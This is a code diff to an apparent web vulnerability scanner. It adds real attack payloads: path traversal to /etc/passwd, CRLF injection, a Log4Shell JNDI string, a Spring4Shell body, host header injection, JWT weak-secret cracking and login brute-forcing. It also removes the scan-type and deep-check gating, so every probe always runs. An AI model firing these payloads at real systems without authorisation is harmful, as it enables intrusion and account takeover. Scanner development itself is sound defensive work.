+    const pathR = await probe(`${target.url.replace(/\/$/, "")}/..%2f`, { timeoutMs: 6_000 });
+    const dotR = await probe(`${target.url.replace(/\/$/, "")}/.%2e/`, { timeoutMs: 6_000 });
+    if ((pathR && pathR.status === 200) || (dotR && dotR.status === 200)) {
+      findings.push({
+        title: "WAF Path Normalisation Bypass (URL-Encoded Traversal)",
+        severity: "medium", verification: "suspected", confidence: 60,
+        cvss: 5.3, cve: null,
+        description: "URL-encoded path segments (%2f, %2e) returned a 200 response, suggesting the WAF does not normalise paths before matching rules. Attackers can use encoding tricks to bypass path-based WAF rules.",
+        evidence: `GET ${target.url}..%2f → HTTP ${pathR?.status ?? "N/A"}\nGET ${target.url}.%2e/ → HTTP ${dotR?.status ?? "N/A"}`,
+        remediation: "Configure the WAF to decode and normalise all URL encoding before applying rules. Enable path normalisation in your WAF settings.",
+      });
+    }
+  } else {
+    await onLog(`[${ts()}] No WAF/CDN signature detected — unprotected origin`);
+  }
+
+  return { findings, wafName: detectedWaf };
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// SUBDOMAIN TAKEOVER
+// ═══════════════════════════════════════════════════════════════════════════════
+
+const TAKEOVER_FINGERPRINTS: Array<{ service: string; cnamePattern: RegExp; indicator: string }> = [
+  { service: "GitHub Pages",   cnamePattern: /github\.io$/i,          indicator: "there isn't a github pages site here" },
+  { service: "Heroku",         cnamePattern: /herokudns\.com$/i,       indicator: "no such app" },
+  { service: "Shopify",        cnamePattern: /myshopify\.com$/i,       indicator: "sorry, this shop is currently unavailable" },
+  { service: "Fastly",         cnamePattern: /fastly\.net$/i,          indicator: "fastly error: unknown domain:" },
+  { service: "Pantheon",       cnamePattern: /pantheonsite\.io$/i,     indicator: "404 error unknown site!" },
+  { service: "Tumblr",         cnamePattern: /tumblr\.com$/i,          indicator: "there's nothing here." },
+  { service: "AWS S3",         cnamePattern: /s3\.amazonaws\.com$/i,   indicator: "nosuchbucket" },
+  { service: "AWS CloudFront", cnamePattern: /cloudfront\.net$/i,      indicator: "the request could not be satisfied" },
+  { service: "Azure Web Apps", cnamePattern: /azurewebsites\.net$/i,   indicator: "404 web site not found" },
+  { service: "Zendesk",        cnamePattern: /zendesk\.com$/i,         indicator: "help center closed" },
+  { service: "Surge.sh",       cnamePattern: /surge\.sh$/i,            indicator: "project not found" },
+  { service: "Netlify",        cnamePattern: /netlify\.app$/i,         indicator: "not found - request id" },
+  { service: "HubSpot",        cnamePattern: /hubspot\.net$/i,         indicator: "domain not found" },
+  { service: "Ghost.io",       cnamePattern: /ghost\.io$/i,            indicator: "used ghost.io" },
+  { service: "UserVoice",      cnamePattern: /uservoice\.com$/i,       indicator: "this uservoice subdomain is currently available" },
+  { service: "Unbounce",       cnamePattern: /unbouncepages\.com$/i,   indicator: "the requested url was not found" },
+  { service: "WordPress.com",  cnamePattern: /wordpress\.com$/i,       indicator: "do you want to register" },
+];
+
+async function checkSubdomainTakeover(subdomains: string[], onLog: LogFn): Promise<RealFinding[]> {
+  const findings: RealFinding[] = [];
+  if (subdomains.length === 0) return findings;
+  const toCheck = subdomains.slice(0, 40);
+  await onLog(`[${ts()}] Checking ${toCheck.length} subdomains for takeover vulnerability...`);
+
+  await Promise.allSettled(
+    toCheck.map(async (sub) => {
+      try {
+        const { stdout } = await execFileAsync("dig", ["+short", "+timeout=3", sub, "CNAME"], { timeout: 8_000 });
+        const cname = stdout.trim().replace(/\.$/, "");
+        if (!cname || cname.length < 4) return;
+        const fp = TAKEOVER_FINGERPRINTS.find(f => f.cnamePattern.test(cname));
+        if (!fp) return;
+        const r = await probe(`https://${sub}`, { timeoutMs: 8_000 });
+        const httpR = !r ? await probe(`http://${sub}`, { timeoutMs: 8_000 }) : null;
+        const body = (r?.body ?? httpR?.body ?? "").toLowerCase();
+        if (body.includes(fp.indicator)) {
+          findings.push({
+            title: `Subdomain Takeover: ${sub} → ${fp.service}`,
+            severity: "critical", verification: "verified", confidence: 96,
+            cvss: 9.8, cve: null,
+            description: `${sub} has a dangling CNAME to ${cname} (${fp.service}) — the destination does not exist. An attacker can claim this resource on ${fp.service} and serve malicious content under your domain, enabling session cookie theft, phishing, CSP bypass, and full credential harvesting.`,
+            evidence: `DNS CNAME: ${sub} → ${cname}\nService: ${fp.service}\nTakeover indicator: "${fp.indicator}" in HTTP ${r?.status ?? httpR?.status} response\nResponse: ${body.slice(0, 300)}`,
+            remediation: `IMMEDIATE: Remove the CNAME record for ${sub}, OR register the resource on ${fp.service} to block hostile takeover.\nAudit all subdomains for dangling CNAMEs regularly using subjack, nuclei, or dnsReaper.`,
+          });
+          await onLog(`[${ts()}] ⚠ SUBDOMAIN TAKEOVER CONFIRMED: ${sub} → ${fp.service} (${cname})`);
+        }
+      } catch { /* DNS timeout */ }
+    }),
+  );
+
+  return findings;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// HOST HEADER INJECTION
+// ═══════════════════════════════════════════════════════════════════════════════
+
+async function checkHostHeaderInjection(target: Target, onLog: LogFn): Promise<RealFinding[]> {
+  const findings: RealFinding[] = [];
+  await onLog(`[${ts()}] Testing host header injection...`);
+  const injectedHost = "evil-sentinelx-bypass.attacker.example";
+
+  for (const [hdrs, label] of [
+    [{ "Host": injectedHost }, "Host"],
+    [{ "X-Forwarded-Host": injectedHost }, "X-Forwarded-Host"],
+    [{ "X-Host": injectedHost }, "X-Host"],
+    [{ "X-Forwarded-Server": injectedHost }, "X-Forwarded-Server"],
+  ] as [Record<string, string>, string][]) {
+    const r = await probe(target.url, { headers: hdrs, followRedirects: false, timeoutMs: 10_000 });
+    if (!r) continue;
+    const reflected = r.body.includes(injectedHost) || (r.headers["location"] ?? "").includes(injectedHost);
+    if (reflected) {
+      findings.push({
+        title: `Host Header Injection via ${label} — Arbitrary Host Reflected`,
+        severity: "high", verification: "verified", confidence: 92,
+        cvss: 7.5, cve: null,
+        description: `The ${label} header value is reflected in the response. This enables password-reset link poisoning: by triggering a password reset for a victim, the reset link in the email will point to the attacker's server, yielding the reset token and enabling account takeover.`,
+        evidence: `GET ${target.url} with ${label}: ${injectedHost}\nHTTP ${r.status}\nInjected host reflected in body: ${r.body.includes(injectedHost)}\nLocation header: ${r.headers["location"] ?? "(none)"}`,
+        remediation: "Build absolute URLs from server-side configuration only. Validate the Host header against a strict allowlist. Use web framework abstractions that handle this safely.",
+      });
+      await onLog(`[${ts()}] ⚠ HOST HEADER INJECTION via ${label}`);
+      return findings;
+    }
+  }
+
+  await onLog(`[${ts()}] Host header injection: no reflection confirmed`);
+  return findings;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// CRLF INJECTION
+// ═══════════════════════════════════════════════════════════════════════════════
+
+async function checkCrlfInjection(target: Target, onLog: LogFn): Promise<RealFinding[]> {
+  const findings: RealFinding[] = [];
+  await onLog(`[${ts()}] Testing CRLF injection (HTTP response splitting)...`);
+
+  const crlfPayloads = [
+    "%0d%0aX-SentinelX-Injected:%20crlf-confirmed",
+    "%0aX-SentinelX-Injected:%20crlf-confirmed",
+    "\r\nX-SentinelX-Injected: crlf-confirmed",
+    "%0d%0a%0d%0aX-SentinelX-Injected:%20crlf-confirmed",
+    "%E5%98%8D%E5%98%8AX-SentinelX-Injected:%20crlf-confirmed",
+  ];
+  const crlfParams = ["url", "next", "redirect", "target", "return", "page", "path", "q", "lang", "ref", "location"];
+
+  for (const param of crlfParams.slice(0, 6)) {
+    for (const payload of crlfPayloads.slice(0, 3)) {
+      const probeUrl = `${target.url.replace(/\/$/, "")}?${param}=${payload}`;
+      const r = await probe(probeUrl, { followRedirects: false, timeoutMs: 8_000 });
+      if (!r) continue;
+      if ((r.headers["x-sentinelx-injected"] ?? "") === "crlf-confirmed") {
+        findings.push({
+          title: "CRLF Injection — HTTP Response Splitting Confirmed",
+          severity: "high", verification: "verified", confidence: 98,
+          cvss: 7.5, cve: null,
+          description: `CRLF characters injected via '${param}' were not filtered and appeared as a new HTTP header (X-SentinelX-Injected) in the response. This enables HTTP response splitting, cookie injection, XSS via header injection, and cache poisoning.`,
+          evidence: `PROBE: GET ${probeUrl}\nPARAM: ${param}=${payload}\nHTTP ${r.status}\nInjected header 'X-SentinelX-Injected: crlf-confirmed' appeared in response headers\nFull response headers: ${r.rawHeaders.slice(0, 400)}`,
+          remediation: "Strip or encode \\r, \\n, %0d, %0a, and UTF-8 CRLF equivalents from any user input included in HTTP response headers. Use framework-provided redirect/header functions that handle this automatically.",
+        });
+        await onLog(`[${ts()}] ⚠ CRLF INJECTION CONFIRMED via param '${param}'`);
+        return findings;
+      }
+    }
+  }
+
+  await onLog(`[${ts()}] CRLF injection: no confirmed injection`);
+  return findings;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// JWT WEAKNESS DETECTION
+// ═══════════════════════════════════════════════════════════════════════════════
+
+function decodeJwtPart(b64url: string): Record<string, unknown> | null {
+  try {
+    const padded = b64url + "=".repeat((4 - b64url.length % 4) % 4);
+    return JSON.parse(Buffer.from(padded, "base64url").toString("utf8"));
+  } catch { return null; }
+}
+
+async function checkJwtWeaknesses(target: Target, onLog: LogFn): Promise<RealFinding[]> {
+  const findings: RealFinding[] = [];
+  await onLog(`[${ts()}] Checking JWT exposure and algorithm weaknesses...`);
+
+  const JWT_REGEX = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/g;
+  const endpoints = [
+    target.url,
+    `${target.url.replace(/\/$/, "")}/api/login`,
+    `${target.url.replace(/\/$/, "")}/api/auth`,
+    `${target.url.replace(/\/$/, "")}/auth`,
+    `${target.url.replace(/\/$/, "")}/login`,
+  ];
+
+  for (const ep of endpoints.slice(0, 4)) {
+    const r = await probe(ep, { timeoutMs: 8_000 });
+    if (!r) continue;
+    const allText = r.body + "\n" + JSON.stringify(r.headers);
+    const tokens = allText.match(JWT_REGEX);
+    if (!tokens?.length) continue;
+
+    const token = tokens[0]!;
+    const parts = token.split(".");
+    if (parts.length !== 3) continue;
+
+    const header = decodeJwtPart(parts[0]!);
+    const payload = decodeJwtPart(parts[1]!);
+    if (!header) continue;
+
+    const alg = String(header.alg ?? "").toUpperCase();
+    await onLog(`[${ts()}] JWT detected at ${ep} — alg: ${alg}`);
+
+    if (alg === "NONE" || alg === "") {
+      findings.push({
+        title: "JWT Algorithm 'none' — Complete Authentication Bypass",
+        severity: "critical", verification: "verified", confidence: 99,
+        cvss: 10.0, cve: null,
+        description: "A JWT with algorithm 'none' was found. These tokens require no cryptographic signature — any payload can be forged without a secret, resulting in complete authentication bypass.",
+        evidence: `Endpoint: ${ep}\nJWT header: ${JSON.stringify(header)}\nAlgorithm: none (unsigned)\nToken: ${token.slice(0, 80)}...`,
+        remediation: "Reject any JWT with alg:none at the validation layer. Use a strict allowlist of accepted algorithms (RS256/ES256 preferred). Update your JWT library.",
+      });
+      await onLog(`[${ts()}] ⚠ JWT ALG:NONE — authentication bypass`);
+    } else if (alg === "HS256") {
+      // Try common weak secrets
+      const WEAK_SECRETS = ["secret", "password", "1234", "changeme", "jwt", "mysecret", "secretkey", "app_secret"];
+      for (const secret of WEAK_SECRETS) {
+        try {
+          const sigInput = `${parts[0]}.${parts[1]}`;
+          const { createHmac } = await import("node:crypto");
+          const sig = createHmac("sha256", secret).update(sigInput).digest("base64url");
+          if (sig === parts[2]) {
+            findings.push({
+              title: "JWT HS256 Weak Secret Cracked",
+              severity: "critical", verification: "verified", confidence: 99,
+              cvss: 9.8, cve: null,
+              description: `The JWT is signed with HS256 and the weak secret "${secret}" was cracked. An attacker can forge arbitrary JWT payloads — changing userId, role, permissions, or any claim — resulting in complete account takeover and privilege escalation.`,
+              evidence: `JWT from: ${ep}\nAlgorithm: HS256\nCracked secret: "${secret}"\nToken: ${token.slice(0, 80)}...`,
+              remediation: "Replace the JWT secret with cryptographically random data (≥256 bits). Rotate all sessions immediately. Migrate to RS256/ES256 to eliminate the shared-secret risk entirely.",
+            });
+            await onLog(`[${ts()}] ⚠ JWT SECRET CRACKED: "${secret}" — all tokens forgeable`);
+            break;
+          }
+        } catch { /* crypto import error */ }
+      }
+      if (!findings.some(f => f.title.includes("Cracked"))) {
+        findings.push({
+          title: "JWT Uses HS256 — Symmetric Algorithm",
+          severity: "medium", verification: "informational", confidence: 72,
+          cvss: 5.3, cve: null,
+          description: "JWT uses HS256 (HMAC-SHA256). Weak secrets can be brute-forced offline. HS256 also requires sharing the secret with every validating service.",
+          evidence: `Endpoint: ${ep}\nAlgorithm: HS256\nToken: ${token.slice(0, 80)}...`,
+          remediation: "Use RS256 or ES256. If HS256 is required, ensure the secret is ≥256 bits of random entropy from a CSPRNG.",
+        });
+      }
+    }
+
+    if (payload && !payload.exp) {
+      findings.push({
+        title: "JWT Missing 'exp' Claim — Non-Expiring Token",
+        severity: "high", verification: "verified", confidence: 95,
+        cvss: 7.5, cve: null,
+        description: "JWT has no 'exp' (expiration) claim and is valid indefinitely. A stolen token remains usable forever with no built-in revocation mechanism.",
+        evidence: `Endpoint: ${ep}\nJWT payload: ${JSON.stringify(payload).slice(0, 300)}\n'exp' claim: absent`,
+        remediation: "Add 'exp' claim to all JWTs. Use short-lived access tokens (≤15 minutes) with refresh token rotation. Implement server-side token revocation lists.",
+      });
+      await onLog(`[${ts()}] ⚠ JWT without 'exp' claim found at ${ep}`);
+    }
+    break; // one JWT endpoint is sufficient
+  }
+
+  return findings;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// PATH TRAVERSAL
+// ═══════════════════════════════════════════════════════════════════════════════
+
+async function checkPathTraversal(target: Target, onLog: LogFn): Promise<RealFinding[]> {
+  const findings: RealFinding[] = [];
+  await onLog(`[${ts()}] Testing path traversal / directory traversal...`);
+
+  const TRAVERSAL_PAYLOADS = [
+    "../../../../etc/passwd",
+    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+    "....//....//....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..%252f..%252f..%252f..%252fetc%252fpasswd",
+    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+    "%2F..%2F..%2F..%2Fetc%2Fpasswd",
+    "..\\..\\..\\..\\windows\\win.ini",
+    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
+  ];
+  const TRAVERSAL_PARAMS = ["file", "path", "page", "include", "doc", "template", "filename", "load", "read", "view", "download", "src", "resource", "module", "name"];
+  const LINUX_PASSWD = /root:.*:0:0:|daemon:.*:1:1:|nobody:.*:99:/;
+  const WINDOWS_INI = /\[fonts\]|\[extensions\]|\[boot loader\]/i;
+
+  for (const param of TRAVERSAL_PARAMS.slice(0, 8)) {
+    for (const payload of TRAVERSAL_PAYLOADS.slice(0, 6)) {
+      const probeUrl = `${target.url.replace(/\/$/, "")}?${param}=${payload}`;
+      const r = await probe(probeUrl, { timeoutMs: 8_000 });
+      if (!r) continue;
+      const isLinux = LINUX_PASSWD.test(r.body);
+      const isWindows = WINDOWS_INI.test(r.body);
+      if (isLinux || isWindows) {
+        findings.push({
+          title: `Path Traversal Confirmed — Arbitrary File Read (${isLinux ? "/etc/passwd" : "win.ini"})`,
+          severity: "critical", verification: "verified", confidence: 99,
+          cvss: 9.1, cve: null,
+          description: `Path traversal confirmed via '${param}' parameter. The server read and returned ${isLinux ? "/etc/passwd" : "windows\\win.ini"}. Attackers can read source code, credentials, private keys, database configuration, and any file the web server process can access.`,
+          evidence: `PROBE: GET ${probeUrl}\nPAYLOAD: ${param}=${payload}\nHTTP ${r.status}\n${isLinux ? "/etc/passwd" : "win.ini"} content confirmed:\n${r.body.match(isLinux ? /root:.*/ : /\[fonts\].*/)?.[0] ?? "(file content)"}`,
+          remediation: "Never use user input to construct file paths. Resolve paths server-side and verify they are within an allowed root (realpath check). Use an allowlist of permitted files. Run the web server with minimal filesystem permissions.",
+        });
+        await onLog(`[${ts()}] ⚠ PATH TRAVERSAL CONFIRMED: file read via '${param}' — ${isLinux ? "/etc/passwd" : "win.ini"}`);
+        return findings;
+      }
+    }
+  }
+
+  await onLog(`[${ts()}] Path traversal: no file read confirmed`);
+  return findings;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// LOG4SHELL / SPRING4SHELL SURFACE DETECTION
+// ═══════════════════════════════════════════════════════════════════════════════
+
+async function checkLog4ShellSurface(target: Target, onLog: LogFn): Promise<RealFinding[]> {
+  const findings: RealFinding[] = [];
+  await onLog(`[${ts()}] Testing Log4Shell (CVE-2021-44228) / Spring4Shell (CVE-2022-22965) surface...`);
+
+  const marker = `sentinelx-${Math.random().toString(36).slice(2, 10)}`;
+  const log4jPayload = `\${jndi:dns://${marker}.sentinel-test.invalid/a}`;
+  const JAVA_ERROR = /java\.lang\.|org\.apache\.log4j|javax\.naming\.|classnotfoundexception|log4j|jndi lookup/i;
+
+  const injectTargets: Array<[string, Record<string, string>, string]> = [
+    [target.url, { "User-Agent": log4jPayload }, "User-Agent"],
+    [target.url, { "X-Forwarded-For": log4jPayload }, "X-Forwarded-For"],
+    [target.url, { "Referer": log4jPayload }, "Referer"],
+    [target.url, { "Accept-Language": log4jPayload }, "Accept-Language"],
+    [`${target.url.replace(/\/$/, "")}?q=${encodeURIComponent(log4jPayload)}`, {}, "query param"],
+  ];
+
+  for (const [url, headers, location] of injectTargets.slice(0, 4)) {
+    const r = await probe(url, { headers, timeoutMs: 10_000 });
+    if (!r) continue;
+    if (JAVA_ERROR.test(r.body)) {
+      findings.push({
+        title: "Log4Shell (CVE-2021-44228) Attack Surface — Java Error Signal",
+        severity: "critical", verification: "suspected", confidence: 72,
+        cvss: 10.0, cve: "CVE-2021-44228",
+        description: "A Log4Shell JNDI payload injected via the " + location + " triggered a Java/Log4j error reference in the response. Note: DNS-callback confirmation requires an out-of-band collaborator. If the target runs Log4j 2.0–2.16.0, it is highly likely vulnerable.",
+        evidence: `Payload injected in: ${location}\nURL: ${url}\nHeaders: ${JSON.stringify(headers)}\nHTTP ${r.status}\nJava/Log4j reference in response: ${r.body.slice(0, 400)}`,
+        remediation: "Upgrade Log4j to ≥2.17.1 immediately. Set -Dlog4j2.formatMsgNoLookups=true as a JVM argument. Block outbound JNDI (LDAP/RMI) connections at the firewall. This is a CVSS 10.0 critical RCE vulnerability.",
+      });
+      await onLog(`[${ts()}] ⚠ LOG4SHELL SURFACE SIGNAL via ${location}`);
+      break;
+    }
+  }
+
+  // Spring4Shell surface
+  const springR = await probe(target.url, {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=sentinelx",
+    timeoutMs: 8_000,
+  });
+  if (springR) {
+    const sb = springR.body.toLowerCase();
+    if (sb.includes("classloader") || sb.includes("spring") || sb.includes("classnotfoundexception") || sb.includes("org.springframework")) {
+      findings.push({
+        title: "Spring4Shell (CVE-2022-22965) Attack Surface Detected",
+        severity: "critical", verification: "suspected", confidence: 65,
+        cvss: 9.8, cve: "CVE-2022-22965",
+        description: "Spring Framework class loader manipulation pattern was referenced in the response. If running Spring Framework 5.3.x < 5.3.18 or 5.2.x < 5.2.20 on JDK 9+, this indicates a critical RCE vulnerability.",
+        evidence: `POST ${target.url}\nContent-Type: application/x-www-form-urlencoded\nBody: Spring class loader pattern\nHTTP ${springR.status}\nSpring reference detected: ${springR.body.slice(0, 300)}`,
+        remediation: "Update Spring Framework to 5.3.18+ or 5.2.20+. Use Spring Boot 2.6.6+ or 2.5.12+. Set spring.mvc.pathmatch.use-suffix-pattern=false in application.properties.",
+      });
+      await onLog(`[${ts()}] ⚠ SPRING4SHELL SURFACE SIGNAL detected`);
+    }
+  }
+
+  await onLog(`[${ts()}] Log4Shell/Spring4Shell surface check complete`);
+  return findings;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// RATE LIMITING ABSENCE ON AUTH ENDPOINTS
+// ═══════════════════════════════════════════════════════════════════════════════
+
+async function checkRateLimiting(target: Target, onLog: LogFn): Promise<RealFinding[]> {
+  const findings: RealFinding[] = [];
+  await onLog(`[${ts()}] Checking for rate limiting on authentication endpoints...`);
+
+  const authEndpoints = [
+    `${target.url.replace(/\/$/, "")}/login`,
+    `${target.url.replace(/\/$/, "")}/api/login`,
+    `${target.url.replace(/\/$/, "")}/auth/login`,
+    `${target.url.replace(/\/$/, "")}/auth`,
+    `${target.url.replace(/\/$/, "")}/forgot-password`,
+    `${target.url.replace(/\/$/, "")}/api/auth`,
+  ];
+
+  for (const ep of authEndpoints.slice(0, 3)) {
+    const first = await probe(ep, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "ratelimit@test.example", password: "wrongpass0" }), timeoutMs: 6_000 });
+    if (!first || first.status === 404) continue;
+
+    const responses: number[] = [first.status];
+    for (let i = 1; i <= 9; i++) {
+      const r = await probe(ep, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "ratelimit@test.example", password: `wrongpass${i}` }), timeoutMs: 6_000 });
+      if (r) responses.push(r.status);
+    }
+
+    if (responses.length >= 8) {
+      const has429 = responses.some(s => s === 429);
+      const hasLockout = responses.some(s => s === 423 || s === 403);
+      if (!has429 && !hasLockout) {
+        findings.push({
+          title: `No Rate Limiting on Auth Endpoint — Brute-Force Possible (${ep.split("/").slice(-2).join("/")})`,
+          severity: "high", verification: "verified", confidence: 85,
+          cvss: 7.5, cve: null,
+          description: `The endpoint ${ep} accepted 10 rapid login attempts with incorrect credentials without any rate limiting (429) or account lockout (423/403). This enables credential stuffing and password brute-force attacks at full network speed.`,
+          evidence: `10 rapid POST requests to ${ep}\nCredentials: wrong passwords #0-9\nAll response codes: ${responses.join(", ")}\nNo 429 (rate limited) or 423/403 (locked) responses received`,
+          remediation: "Implement rate limiting: max 5 failed attempts per IP per 15 minutes with exponential backoff. Add account lockout after 10 failures. Use CAPTCHA after 3 failures. Consider device fingerprinting.",
+        });
+        await onLog(`[${ts()}] ⚠ NO RATE LIMITING on ${ep} — 10 requests, all same status: ${responses[0]}`);
+        break;
+      } else {
+        await onLog(`[${ts()}] Rate limiting confirmed on ${ep} (status: ${responses.find(s => s === 429 || s === 423)})`);
+        break;
+      }
+    }
+  }
+
+  return findings;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
 // MAIN ORCHESTRATOR
 // ═══════════════════════════════════════════════════════════════════════════════
 
@@ -1806,101 +2491,124 @@ export async function scanTarget(
   await onLog(`[${ts()}] ═══════════════════════════════════════`);
   await onLog(`[${ts()}] TARGET  : ${target.url}`);
   await onLog(`[${ts()}] HOST    : ${target.hostname}`);
-  await onLog(`[${ts()}] SCAN    : ${scanType.toUpperCase()} / PROFILE ${policy.profile.toUpperCase()}`);
-  await onLog(`[${ts()}] POLICY  : ${policy.requestBudget} request budget · ${policy.timeoutMs}ms timeout · ${policy.maxConcurrency} concurrency`);
-  await onLog(`[${ts()}] TOOLS   : nmap · dig · whois · openssl · fetch`);
+  await onLog(`[${ts()}] SCAN    : FULL DEEP SCAN / PROFILE ${policy.profile.toUpperCase()}`);
+  await onLog(`[${ts()}] POLICY  : ${policy.requestBudget} request budget · ${policy.timeoutMs}ms timeout · concurrency ${policy.maxConcurrency}`);
+  await onLog(`[${ts()}] TOOLS   : nmap · dig · whois · openssl · fetch · crt.sh · ipinfo.io · Wayback`);
   await onLog(`[${ts()}] ═══════════════════════════════════════`);
 
-  // ── Phase 1: DNS enumeration (all types) ──────────────────────────────────
-  await onLog(`[${ts()}] [Phase 1] DNS enumeration (dig)...`);
+  // ── Phase 1: WAF detection and bypass ─────────────────────────────────────
+  await onLog(`[${ts()}] [Phase 1] WAF/CDN detection and bypass testing...`);
+  const { findings: wafFindings, wafName } = await checkWafAndBypass(target, onLog);
+  add(wafFindings);
+
+  // ── Phase 2: DNS enumeration ──────────────────────────────────────────────
+  await onLog(`[${ts()}] [Phase 2] DNS enumeration (dig — A/AAAA/MX/TXT/NS/CAA/AXFR)...`);
   add(await checkDns(target.hostname, onLog));
 
-  // ── Phase 2: IP geolocation (all types) ───────────────────────────────────
-  await onLog(`[${ts()}] [Phase 2] IP geolocation & ASN lookup...`);
+  // ── Phase 3: IP geolocation & ASN ────────────────────────────────────────
+  await onLog(`[${ts()}] [Phase 3] IP geolocation & ASN intelligence (ipinfo.io)...`);
   await getIpInfo(target.hostname, onLog);
 
-  // ── Phase 3: WHOIS (recon, full) ─────────────────────────────────────────
-  if (["recon", "full"].includes(scanType) && assetType !== "ip") {
-    await onLog(`[${ts()}] [Phase 3] WHOIS domain intelligence...`);
+  // ── Phase 4: WHOIS domain intelligence ───────────────────────────────────
+  if (assetType !== "ip") {
+    await onLog(`[${ts()}] [Phase 4] WHOIS domain intelligence...`);
     add(await checkWhois(target.hostname, onLog));
   }
 
-  // ── Phase 4: Subdomain discovery (enumeration, full) ─────────────────────
-  if (["enumeration", "full"].includes(scanType) && assetType !== "ip") {
-    await onLog(`[${ts()}] [Phase 4] Subdomain discovery (crt.sh + DNS brute force)...`);
+  // ── Phase 5: Subdomain discovery + takeover check ─────────────────────────
+  let discoveredSubs: string[] = [];
+  if (assetType !== "ip") {
+    await onLog(`[${ts()}] [Phase 5] Subdomain discovery (crt.sh + DNS brute force)...`);
     const { findings: subFindings, subs } = await discoverSubdomains(target.hostname, onLog);
     add(subFindings);
+    discoveredSubs = subs;
     await onLog(`[${ts()}] Total subdomains in scope: ${subs.length}`);
+
+    // Subdomain takeover check
+    await onLog(`[${ts()}] [Phase 5b] Subdomain takeover detection...`);
+    add(await checkSubdomainTakeover(discoveredSubs, onLog));
   }
 
-  // ── Phase 5: Port scanning with nmap (enumeration, vulnerability, full) ───
-  if (["enumeration", "vulnerability", "full"].includes(scanType)) {
-    await onLog(`[${ts()}] [Phase 5] Port scanning with nmap...`);
-    add(await checkPorts(target.hostname, scanType, onLog));
-  }
+  // ── Phase 6: Port scanning (nmap) ─────────────────────────────────────────
+  await onLog(`[${ts()}] [Phase 6] Full port scanning with nmap (service version detection)...`);
+  add(await checkPorts(target.hostname, "full", onLog));
 
-  // ── Phase 6: TLS / SSL analysis (all HTTPS targets) ──────────────────────
+  // ── Phase 7: TLS / SSL analysis ───────────────────────────────────────────
   if (target.isHttps) {
-    await onLog(`[${ts()}] [Phase 6] TLS/SSL analysis (openssl + node:tls)...`);
+    await onLog(`[${ts()}] [Phase 7] TLS/SSL analysis (openssl + node:tls — certs, protocols, ciphers)...`);
     add(await checkTls(target.hostname, target.port, onLog));
   }
 
-  // ── Phase 7: HTTP security headers (all types) ───────────────────────────
-  await onLog(`[${ts()}] [Phase 7] HTTP security header analysis...`);
+  // ── Phase 8: HTTP security headers ────────────────────────────────────────
+  await onLog(`[${ts()}] [Phase 8] HTTP security header analysis (HSTS/CSP/CORS/cookies)...`);
   add(await checkHeaders(target, onLog));
 
-  // ── Phase 8: Technology fingerprinting (all types) ───────────────────────
-  await onLog(`[${ts()}] [Phase 8] Technology fingerprinting...`);
+  // ── Phase 9: Technology fingerprinting ────────────────────────────────────
+  await onLog(`[${ts()}] [Phase 9] Technology fingerprinting...`);
   const { techs, findings: fpFindings } = await fingerprint(target, onLog);
   add(fpFindings);
   if (techs.length > 0) {
     await onLog(`[${ts()}] Stack detected: ${techs.map((t) => `${t.name} (${t.category})`).join(" · ")}`);
   }
 
-  // ── Phase 9: Sensitive path discovery (enumeration, vulnerability, full) ──
-  if (["enumeration", "vulnerability", "full"].includes(scanType)) {
-    const deep = ["vulnerability", "full"].includes(scanType);
-    await onLog(`[${ts()}] [Phase 9] Sensitive path discovery (${deep ? "deep mode" : "standard"})...`);
-    add(await checkSensitivePaths(target, deep, onLog));
-  }
+  // ── Phase 10: Sensitive path discovery (deep mode always) ─────────────────
+  await onLog(`[${ts()}] [Phase 10] Sensitive path discovery (deep mode — ${SENSITIVE_PATHS.length} paths)...`);
+  add(await checkSensitivePaths(target, true, onLog));
 
-  // ── Phase 10: Wayback Machine (enumeration, full) ─────────────────────────
-  if (["enumeration", "full"].includes(scanType)) {
-    await onLog(`[${ts()}] [Phase 10] Wayback Machine endpoint discovery...`);
-    add(await checkWayback(target.hostname, onLog));
-  }
+  // ── Phase 11: Wayback Machine endpoint discovery ───────────────────────────
+  await onLog(`[${ts()}] [Phase 11] Wayback Machine historical endpoint discovery...`);
+  add(await checkWayback(target.hostname, onLog));
 
-  // ── Phase 11: Web app vulnerability probes (vulnerability, full) ──────────
-  if (["vulnerability", "full"].includes(scanType) && policy.allowDeepChecks) {
-    await onLog(`[${ts()}] [Phase 11] Web application vulnerability probes...`);
-    add(await checkWebApp(target, onLog));
-  }
+  // ── Phase 12: Web application vulnerability probes ────────────────────────
+  await onLog(`[${ts()}] [Phase 12] Web app probes — SQLi (error+blind) · XSS · NoSQL · CMDi · redirects · methods...`);
+  add(await checkWebApp(target, onLog));
 
-  // ── Phase 12: API surface discovery (vulnerability, full) ─────────────────
-  if (["vulnerability", "full"].includes(scanType)) {
-    await onLog(`[${ts()}] [Phase 12] API surface & documentation discovery...`);
-    add(await checkApiSurface(target, onLog));
-  }
+  // ── Phase 13: API surface discovery ──────────────────────────────────────
+  await onLog(`[${ts()}] [Phase 13] API surface — GraphQL · Swagger · Spring Actuator · Telescope...`);
+  add(await checkApiSurface(target, onLog));
 
-  // ── Phase 13: Advanced vulnerability probes (vulnerability, full) ──────────
-  if (["vulnerability", "full"].includes(scanType)) {
-    const { checkSSTI, checkXXE, checkSSRF, checkDeserialization, lookupCvesForTechs } = await import("./vuln-probes");
+  // ── Phase 14: Host header injection ──────────────────────────────────────
+  await onLog(`[${ts()}] [Phase 14] Host header injection / password-reset poisoning...`);
+  add(await checkHostHeaderInjection(target, onLog));
 
